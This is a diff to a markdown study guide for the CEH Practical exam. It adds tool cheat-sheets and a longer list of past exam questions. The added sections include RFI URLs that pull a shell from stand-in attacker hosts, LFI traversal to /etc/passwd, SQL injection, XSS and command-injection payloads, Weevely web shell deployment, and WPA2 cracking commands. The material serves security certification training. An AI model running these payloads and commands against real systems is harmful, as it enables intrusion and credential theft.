@@ -523,6 +523,269 @@ Lateral movement techniques allow attackers to spread within the network once in
 
 ---
 
+### 15. **🖥️ Remote File Inclusion (RFI) & Local File Inclusion (LFI)**
+
+#### **RFI (Remote File Inclusion)**
+
+Remote File Inclusion allows attackers to include external files hosted on another server into the web application.
+
+- **Basic RFI Example**:
+  ```php
+  http://example.com/index.php?page=http://evil.com/shell.txt
+  ```
+- **Exploiting RFI**:
+  - Hosting a PHP reverse shell on your server and including it in the target:
+  ```php
+  http://target.com/index.php?page=http://attacker.com/shell.php
+  ```
+
+#### **LFI (Local File Inclusion)**
+
+Local File Inclusion allows attackers to include files present on the web server itself.
+
+- **Basic LFI Example**:
+  ```php
+  http://example.com/index.php?page=../../../../etc/passwd
+  ```
+- **Bypassing File Extension Filters**:
+  - Null byte injection (`%00`) or double extensions can be used to bypass file extension filters.
+  ```php
+  http://example.com/index.php?page=../../../../etc/passwd%00
+  ```
+
+#### **RFI & LFI Prevention**:
+- Input validation and output encoding.
+- Use **realpath()** and **basename()** functions in PHP.
+
+---
+
+### 16. **🔨 DVWA Modules**
+
+#### **DVWA (Damn Vulnerable Web Application)**
+
+- **SQL Injection**:
+  - **Example**: `admin'--`
+  - **Automated Exploit**: Use `sqlmap -u [TARGET_URL] --dbs` to dump databases.
+  
+- **Cross-Site Scripting (XSS)**:
+  - **Stored XSS Example**: `<script>alert('XSS');</script>`
+  - **Reflected XSS Example**: Insert the script directly into URL parameters.
+  
+- **File Upload Vulnerabilities**:
+  - **Exploit**: Upload a malicious PHP file, like a web shell (`shell.php`), and access it via the target's web directory.
+
+- **Command Injection**:
+  - **Example**: Use `; cat /etc/passwd` in a vulnerable form field to chain commands.
+
+---
+
+### 17. **🖥️ Weevely (Webshell Tool)**
+
+Weevely is a stealthy PHP web shell used for remote command execution and backdoor access.
+
+- **Weevely Basic Usage**:
+  - **Generate Shell**:
+    ```bash
+    weevely generate password shell.php
+    ```
+  - **Deploy the shell to a web server** by uploading `shell.php` and then use Weevely to connect:
+    ```bash
+    weevely http://target.com/shell.php password
+    ```
+    ### 18.  **Snow (Steganography Tool)**
+
+**Snow** is a whitespace steganography tool that hides messages in ASCII text files by appending spaces and tabs at the end of lines.
+
+- **Basic Syntax**:
+  ```bash
+  snow -C -m "Your secret message" -p "password" input.txt output.txt
+  ```
+  - `-C`: Compress the message.
+  - `-m`: Specifies the message to hide.
+  - `-p`: Password for encryption.
+
+- **Extracting Hidden Messages**:
+  ```bash
+  snow -C -p "password" output.txt
+  ```
+  This command retrieves the hidden message using the specified password.
+
+**Key Use Cases**: 
+- Hide sensitive information inside text files for secure communication.
+
+---
+
+### 19.  **VeraCrypt (Disk Encryption Tool)**
+
+**VeraCrypt** is a disk encryption tool used for creating encrypted volumes and partitions, offering enhanced security for sensitive data.
+
+- **Basic Usage**:
+  1. **Creating an Encrypted Volume**:
+     - Select **Create Volume** and choose **Create an encrypted file container**.
+     - Choose encryption options like **AES** and **SHA-256** for the volume.
+  2. **Mounting an Encrypted Volume**:
+     - Use the GUI to select the encrypted volume and mount it by providing the password.
+
+- **Command-Line Usage**:
+  - **Mount Volume**:
+    ```bash
+    veracrypt --mount encrypted_volume.tc /mnt/secure
+    ```
+  - **Dismount Volume**:
+    ```bash
+    veracrypt -d /mnt/secure
+    ```
+
+**Key Use Cases**:
+- Securely store sensitive files or entire partitions using encryption algorithms like **AES** and **Twofish**.
+
+---
+
+### 20.  **OpenStego (Steganography Tool)**
+
+**OpenStego** is an open-source steganography tool that hides data inside images or other files.
+
+- **Basic Usage**:
+  1. **Embed Data**:
+     ```bash
+     openstego -embed -mf secret.txt -cf cover.png -sf stego.png
+     ```
+     - `-mf`: Specifies the message file.
+     - `-cf`: Specifies the cover file (the image in which to hide the data).
+     - `-sf`: Specifies the stego file (the output image with hidden data).
+
+  2. **Extract Data**:
+     ```bash
+     openstego -extract -sf stego.png -mf extracted.txt
+     ```
+
+**Key Use Cases**:
+- Hide sensitive text or files inside image files for covert communication.
+
+---
+
+### 21. **Cryptool (Cryptography Learning Tool)**
+
+**Cryptool** is an educational tool that helps users understand cryptographic algorithms and techniques through visual representations and simulations.
+
+- **Basic Cryptanalysis Example** (in GUI):
+  1. **Open Cryptool** and select the cryptographic algorithm to explore, such as **RSA** or **AES**.
+  2. **Perform Encryption**:
+     - Enter a plaintext message and choose an encryption method.
+  3. **Decrypt Encrypted Text** using the provided keys and analyze the encryption process.
+
+**Key Use Cases**:
+- Learn and visualize encryption algorithms like **RSA**, **AES**, and **DES**.
+- Perform cryptographic analysis and brute-force decryption.
+
+---
+
+### 22. **DIE (Detect It Easy)**
+
+**DIE** is a tool for detecting the type of binary files and analyzing their characteristics. It's useful in malware analysis and reverse engineering.
+
+- **Basic Usage**:
+  - Open a binary file in DIE, and it automatically detects the file type, architecture, and any packers or obfuscators used.
+
+- **Key Features**:
+  - File format identification (PE, ELF, Mach-O, etc.).
+  - Detects compilers and packers used to build the binary.
+
+**Key Use Cases**:
+- Analyzing malware or obfuscated binaries to understand their structure.
+
+---
+
+### 23. **Aircrack-ng (Wireless Network Cracking)**
+
+**Aircrack-ng** is a suite of tools for wireless network security, including tools for monitoring, attacking, testing, and cracking WiFi networks.
+
+- **Capturing Packets (airodump-ng)**:
+  - Start monitoring for nearby WiFi networks and capturing packets:
+    ```bash
+    airodump-ng wlan0mon
+    ```
+  - Target a specific network for packet capture:
+    ```bash
+    airodump-ng -c [channel] --bssid [BSSID] -w [output_file] wlan0mon
+    ```
+
+- **Cracking WPA2 Password (aircrack-ng)**:
+  - Use captured packets to crack the WPA2 handshake:
+    ```bash
+    aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] [capture_file].cap
+    ```
+
+**Key Use Cases**:
+- Capture network packets for cracking WPA2 and WEP encryption.
+- Analyze and crack encrypted WiFi traffic using a dictionary attack.
+
+---
+
+### 24. **HashCalc (Hash Calculation Tool)**
+
+**HashCalc** is a tool used to calculate various cryptographic hashes for files and text.
+
+- **Basic Usage**:
+  - Open **HashCalc** and input the file or text.
+  - Select the desired hash function (e.g., **MD5**, **SHA-1**, **SHA-256**).
+  - Generate the hash for the given input.
+
+**Key Use Cases**:
+- Verify file integrity by comparing hash values.
+- Generate cryptographic hash values for files and messages.
+
+---
+
+### 25. **MD5 Calculator (MD5 Hash Calculation Tool)**
+
+**MD5 Calculator** is a lightweight tool that calculates the **MD5** hash for a file or text input.
+
+- **Basic Usage**:
+  - Select a file, and the tool will compute the **MD5** hash value.
+
+**Key Use Cases**:
+- Check file integrity by comparing **MD5** hashes.
+
+---
+
+### 26. **TCPDump (Packet Capture Tool)**
+
+**TCPDump** is a command-line packet analyzer that captures and displays network traffic passing through a system.
+
+- **Basic Packet Capture**:
+  - Capture all packets on an interface:
+    ```bash
+    tcpdump -i eth0
+    ```
+  - Capture packets to a file:
+    ```bash
+    tcpdump -i eth0 -w capture.pcap
+    ```
+  - Read a saved packet capture:
+    ```bash
+    tcpdump -r capture.pcap
+    ```
+
+- **Capture Specific Traffic**:
+  - Capture HTTP traffic:
+    ```bash
+    tcpdump -i eth0 'tcp port 80'
+    ```
+  - Capture traffic to/from a specific IP:
+    ```bash
+    tcpdump -i eth0 host 192.168.1.1
+    ```
+
+**Key Use Cases**:
+- Monitor and capture network traffic for analysis.
+- Identify malicious activity or troubleshoot network issues.
+
+---
+
+
+---
+
 
 ### **🔥 Some Important Past Paper Questions**
 
@@ -553,6 +816,96 @@ Here are some **repeated questions** often seen in the CEH Practical exam, compi
 
 8. **Brute Forcing Using Burp Suite**:
    - Learn how to capture a request, send it to **Intruder**, and launch a brute-force attack using wordlists.
+   
+9. **Find the IP of the Windows machine.**
+   - Use `nmap -O [TARGET_NETWORK]` or `netdiscover -i eth0`
+
+10. **What is the version of the Linux Kernel?**
+   - Use `nmap -O [TARGET_IP]`
+
+11. **How many Windows machines are there?**
+   - Use `netdiscover -i eth0`
+
+12. **What is the password for the user of the FTP server?**
+   - Use `hydra` or `ftp` login attempts.
+
+13. **What is the password hidden in the .jpeg file?**
+   - Use steganography tools like **Steghide**, **OpenStego**, or **Snow**.
+
+14. **Find the IP address of the machine running RDP?**
+   - Use `nmap -p 3389 [TARGET_NETWORK]`
+
+15. **Find the HTTP method that poses a high risk to the application example.com?**
+   - Use `nmap --script http-methods -p 80 example.com`
+
+16. **Find the phone number of the employee?**
+   - Perform OSINT or check metadata in files using `exiftool`.
+
+17. **Find the filename which is tampered by comparing the hashes given in the /hashes folder?**
+   - Use `md5sum` or `sha1sum` to compare hashes.
+
+18. **Decrypt the volume file using VeraCrypt?**
+    - Use **VeraCrypt** to mount and decrypt the volume.
+
+19. **Connect to the server remotely using the credentials given via RDP?**
+    - Use `rdesktop` or `mstsc` command.
+
+20. **Decode the file which is encoded in DES (ECB) format?**
+    - Use cryptography tools like **OpenSSL**.
+
+21. **Find the password of the WordPress user “Demo”?**
+    - Use **WPScan** to enumerate users and brute-force passwords.
+
+22. **Find the attacker's IP address who has launched the DoS attack?**
+    - Analyze the provided PCAP file using **Wireshark**.
+
+23. **Find the number of machines that were used to initiate the DDoS attack?**
+    - Analyze network traffic in the PCAP file.
+
+24. **Find the username/password from the pcap file, which is in plain text?**
+    - Use **Wireshark** to extract credentials from unencrypted protocols.
+
+25. **Extract the information from the SD card of the Android user?**
+    - Use **ADB** or Android forensics tools.
+
+26. **Find the OS name of the machine which is running MySQL database?**
+    - Use `nmap -sV -p 3306 [TARGET_IP]`
+
+27. **Find the Domain Controller’s name.**
+    - Use `nmap --script smb-os-discovery.nse -p 445 [TARGET_IP]`
+
+28. **Discover the IP of “wampserver”.**
+    - Use `nmap -sV -p 80 [TARGET_NETWORK]`
+
+29. **Crack “UserX’s” SMB credentials and decrypt “File.txt.”**
+    - Use **Hydra** for SMB brute-force; decrypt file with obtained credentials.
+
+30. **Determine the End of Life severity score on a specific host.**
+    - Use vulnerability scanners like **Nessus**.
+
+31. **Extract the data from “HiddenImage.jpg.”**
+    - Use steganography tools.
+
+32. **Exploit weak FTP credentials.**
+    - Use **Hydra** or manual FTP login attempts.
+
+33. **Gain root access using [exploit].**
+    - Identify and use a local privilege escalation exploit.
+
+34. **Find the entry point (address) in a given binary.**
+    - Use reverse engineering tools like **Ghidra** or **OllyDbg**.
+
+35. **Identify the attacker’s IP in “ddos.pcap” targeting a specific IP address.**
+    - Analyze PCAP with **Wireshark**.
+
+36. **Perform an SQL injection to extract data.**
+    - Use **SqlMap** or manual SQL injection techniques.
+
+37. **Identify IoT Publish Message length from traffic capture.**
+    - Analyze MQTT traffic in **Wireshark**.
+
+38. **Crack wireless encryption in “WirelessCapture.cap”.**
+    - Use **Aircrack-ng** suite.
 
 **Additional Resources**:
    - For hands-on practice, check out [TryHackMe Rooms](https://tryhackme.com) like:
@@ -561,80 +914,11 @@ Here are some **repeated questions** often seen in the CEH Practical exam, compi
      - **John the Ripper**: [John the Ripper TryHackMe](https://tryhackme.com/room/johntheripper0)
      - **Metasploit**: [Metasploit TryHackMe](https://tryhackme.com/room/rpmetasploit)
 
----
-
-
 
 ---
 
-## 🔥 **8. Some Important Past Paper Questions**
 
-Here are some **repeated questions** often seen in the CEH Practical exam:
-
-1. **Find the IP of the Windows machine.**
-   - Use `nmap -O [TARGET_NETWORK]` or `netdiscover -i eth0`
-2. **What is the version of the Linux Kernel?**
-   - Use `nmap -O [TARGET_IP]`
-3. **How many Windows machines are there?**
-   - Use `netdiscover -i eth0`
-4. **What is the password for the user of the FTP server?**
-   - Use `hydra` or `ftp` login attempts.
-5. **What is the password hidden in the .jpeg file?**
-   - Use steganography tools like **Steghide**, **OpenStego**, or **Snow**.
-6. **Find the IP address of the machine running RDP?**
-   - Use `nmap -p 3389 [TARGET_NETWORK]`
-7. **Find the HTTP method that poses a high risk to the application example.com?**
-   - Use `nmap --script http-methods -p 80 example.com`
-8. **Find the phone number of the employee?**
-   - Perform OSINT or check metadata in files using `exiftool`.
-9. **Find the filename which is tampered by comparing the hashes given in the /hashes folder?**
-   - Use `md5sum` or `sha1sum` to compare hashes.
-10. **Decrypt the volume file using VeraCrypt?**
-    - Use **VeraCrypt** to mount and decrypt the volume.
-11. **Connect to the server remotely using the credentials given via RDP?**
-    - Use `rdesktop` or `mstsc` command.
-12. **Decode the file which is encoded in DES (ECB) format?**
-    - Use cryptography tools like **OpenSSL**.
-13. **Find the password of the WordPress user “Demo”?**
-    - Use **WPScan** to enumerate users and brute-force passwords.
-14. **Find the attacker's IP address who has launched the DoS attack?**
-    - Analyze the provided PCAP file using **Wireshark**.
-15. **Find the number of machines that were used to initiate the DDoS attack?**
-    - Analyze network traffic in the PCAP file.
-16. **Find the username/password from the pcap file, which is in plain text?**
-    - Use **Wireshark** to extract credentials from unencrypted protocols.
-17. **Extract the information from the SD card of the Android user?**
-    - Use **ADB** or Android forensics tools.
-18. **Find the OS name of the machine which is running MySQL database?**
-    - Use `nmap -sV -p 3306 [TARGET_IP]`
-19. **Find the Domain Controller’s name.**
-    - Use `nmap --script smb-os-discovery.nse -p 445 [TARGET_IP]`
-20. **Discover the IP of “wampserver”.**
-    - Use `nmap -sV -p 80 [TARGET_NETWORK]`
-21. **Crack “UserX’s” SMB credentials and decrypt “File.txt.”**
-    - Use **Hydra** for SMB brute-force; decrypt file with obtained credentials.
-22. **Determine the End of Life severity score on a specific host.**
-    - Use vulnerability scanners like **Nessus**.
-23. **Extract the data from “HiddenImage.jpg.”**
-    - Use steganography tools.
-24. **Exploit weak FTP credentials.**
-    - Use **Hydra** or manual FTP login attempts.
-25. **Gain root access using [exploit].**
-    - Identify and use a local privilege escalation exploit.
-26. **Find the entry point (address) in a given binary.**
-    - Use reverse engineering tools like **Ghidra** or **OllyDbg**.
-27. **Identify the attacker’s IP in “ddos.pcap” targeting a specific IP address.**
-    - Analyze PCAP with **Wireshark**.
-28. **Perform an SQL injection to extract data.**
-    - Use **SqlMap** or manual SQL injection techniques.
-29. **Identify IoT Publish Message length from traffic capture.**
-    - Analyze MQTT traffic in **Wireshark**.
-30. **Crack wireless encryption in “WirelessCapture.cap”.**
-    - Use **Aircrack-ng** suite.
-
----
-
-## 🛠️ **9. Tools You Must Have Hands-On**
+## 🛠️ **Tools You Must Have Hands-On**
 
 To excel in the CEH Practical Exam, it's crucial to have hands-on experience with the following tools:
 
